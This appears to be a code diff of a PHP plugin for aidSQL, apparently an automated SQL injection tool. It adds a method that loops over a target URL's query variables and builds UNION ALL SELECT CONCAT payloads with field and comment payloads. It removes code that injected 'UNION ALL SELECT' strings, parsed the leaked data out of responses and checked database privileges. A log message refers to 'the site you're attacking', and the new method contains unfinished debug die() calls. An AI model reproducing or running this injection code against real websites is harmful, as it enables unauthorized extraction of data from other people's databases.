@@ -11,19 +11,65 @@
 			private	$_strRepeat						=	100;
 			private	$_repeatCharacter				=	"a";
 
-			public function isVulnerable(){
+			public function injectionUnionWithConcat(){
 
-				$parser	=	new \aidSQL\parser\Generic();
-				$parser->setLog($this->_logger);
+				$parser			=	new \aidSQL\parser\Generic();
+				
 				$parser->setOpenTag("NULL");
 				$parser->setCloseTag("NULL");
+
 				$this->setParser($parser);
-				$this->_queryBuilder->union(array(1,2,3,4,5));
-				echo $this->_queryBuilder."\n";
-				die();
-				if(parent::isVulnerable()){
-					$this->getGroupConcatLength();
+
+				$offset	=	(isset($this->_config["start-offset"])) ? (int)$this->_config["start-offset"] : 1;
+
+				if(!$offset){
+					throw(new \Exception("Start offset should be an integer greater than 0!"));
 				}
+
+				$fieldPayloads		=	explode('_',$this->_config["field-payloads"]);
+				$commentPayloads	=	explode('_',$this->_config["comment-payloads"]);
+
+				$vars					=	$this->_httpAdapter->getUrl()->getQueryAsArray();
+
+				foreach($vars as $variable=>$value){
+
+					$this->_affectedUrlvariable	=	$variable;
+
+					$iterationContainer				=	array();
+					$queryBuilder						=	new \aidSQL\core\QueryBuilder();
+
+					for($maxFields=$offset;$maxFields<=$this->_injectionAttempts;$maxFields++){
+
+						$iterationContainer[]	=	$maxFields;
+
+						$queryBuilder->union($queryBuilder->wrapArray($iterationContainer,"CONCAT(NULL,%value%,NULL)"),"ALL");
+						var_dump($queryBuilder->getSQL());	
+						die();
+
+						foreach($fieldPayloads as $payLoad){
+
+							foreach($commentPayloads as $comment){
+
+								if($isVulnerable	=	$this->query($queryBuilder,__FUNCTION__)){
+									var_dump($isVulnerable);
+									die();
+								}
+
+							}
+
+						}
+
+					}
+
+					$url	=	$this->_httpAdapter->getUrl();
+
+					//Restore value if we couldnt find the vulnerable field
+					$url->addRequestVariable($variable,$value); 
+					$this->_httpAdapter->setUrl($url);
+
+				}
+
+				return FALSE;
 
 			}
 
@@ -31,8 +77,6 @@
 				return self::PLUGIN_NAME;
 			}
 
-			public function getInjectionMethods(){
-			}
 
 			public function getAffectedDatabases(){
 				return $this->_affectedDatabases;
@@ -75,18 +119,6 @@
 				}
 
 				$this->_groupConcatLength	=	$length;
-
-			}
-
-			public function setMaxFields($maxFields){
-
-				$maxFields = (int)$maxFields;
-
-				if(is_null($maxFields)||$maxFields==0){
-					throw (new \Exception("The max fields cannot be NULL or 0"));
-				}
-
-				$this->_maxFields = $maxFields;
 
 			}
 
@@ -215,7 +247,7 @@
 
 			}
 
-			private function cleanUpResult($result){
+			private function cleanUpRepeatInjectionResult($result){
 
 				$length	=	strlen($this->_repeatCharacter);
 				$result	=	substr($result,$this->_strRepeat*$length);
@@ -223,52 +255,6 @@
 
 				return $result;
 
-			}
-
-			protected function execute($select,$from=NULL,$useConcat=TRUE){
-
-				$this->log("Doing $select Injection",0,"light_green");
-				$generatedInjection	=	$this->generateInjection($select,$from,$useConcat);
-				$this->log($generatedInjection,0,"light_cyan");
-
-				$result	=	$this->analyzeInjection($generatedInjection);
-
-				if($this->_isVulnerable){
-
-					if($result===FALSE){		//Found vulnerable however something is failing, start injection from scratch
-
-						$restoreMaxFields	=	$this->_maxFields;
-
-						$this->log("Something wrong is going on here, restarting the $select injection",2,"yellow");
-
-						$this->_maxFields=1;
-
-						while($this->_maxFields<=$this->_injectionAttempts){	
-
-							$result	=	$this->analyzeInjection($this->generateInjection($select,$from,$useConcat));
-
-							if(isset($result[0])){
-								return $result[0];
-							}
-
-							$this->_maxFields++;
-
-						}
-
-						$this->_maxFields	=	$restoreMaxFields;
-
-						return FALSE;
-
-					}
-
-				}
-
-				if(isset($result[0])){
-					return $this->cleanUpResult($result[0]);
-				}
-
-				return FALSE;
-				
 			}
 
 			public function getUser(){
@@ -304,88 +290,6 @@
 
 			}
 
-
-
-			/**
-			*Combines URL execution with parsing
-			*/
-
-			private function analyzeInjection($injection,$useEndingPayload=TRUE){
-
-				$variable	= $this->_affectedVariable;
-
-				$value		= $variable["value"];
-				$variable	= $variable["variable"];
-
-				if($value==""){
-
-					$value = mt_rand(0,10);
-
-					$this->log("WARNING! Variable value is not set, this will probably make this plugin not to work!",2,"yellow");
-					$this->log("Be sure to specify a valid value for the URL variable of the site you're attacking.",2,"yellow");
-					$this->log("Assuming random value for variable $variable. Value is: $value",2,"yellow");
-
-				}
-
-				$value	.= $this->_currFieldPayload;
-
-				if($useEndingPayload){
-
-					$value		= "$value UNION ALL SELECT $injection ".$this->_currTerminatingPayload." ".$this->getQueryCommentOpen();
-
-				}else{
-
-					$value		= "$value UNION ALL SELECT $injection ".$this->getQueryCommentOpen();
-
-				}
-
-				$content	=	parent::execute($variable,$value);
-
-				return $this->_checkInjection($content);
-
-			}
-
-
-			private function _checkInjection($content){
-
-				$openTag		=	$this->getOpenTag();
-				$closeTag	=	$this->getCloseTag();
-
-				$repeat	=	str_repeat($this->_repeatCharacter,$this->_strRepeat);
-				$regex	= '/'.$repeat."+.*".$repeat.'/';
-
-				$matches = NULL;
-
-				preg_match_all($regex,$content,$matches,PREG_SET_ORDER);
-
-				if(sizeof($matches)){
-
-					$matching = array();
-
-					foreach($matches as $key=>$match){
-
-						$match=$match[0];
-						$match = preg_replace("/^($openTag)/",'',$match);
-						$match = preg_replace("/($closeTag)/",'',$match);
-						$matching[$key]=$match;
-
-					}
-
-					return $matching;
-
-				}
-
-				return FALSE;
-
-			}
-
-			private function pickRandomValue(Array $array){
-
-				shuffle($array);
-				return $array[0];
-
-			}
-
 			public function isRoot($dbUser=NULL,\aidSQL\http\Adapter &$adapter=NULL){
 
 				if(empty($dbUser)){
@@ -412,7 +316,7 @@
 
 			}
 
-			public function checkPrivilege($privilege,$user=NULL){
+			private function checkPrivilege($privilege,$user=NULL){
 
 				$privilege			=	\String::hexEncode($privilege);
 				$fieldInjection	=	"is_grantable";
@@ -554,12 +458,6 @@
 
 			}
 
-
-			public function setConfig (Array $config){
-
-				parent::setConfig($config);
-
-			}
 
 			public static function getHelp(\aidSQL\core\Logger $logger){
 
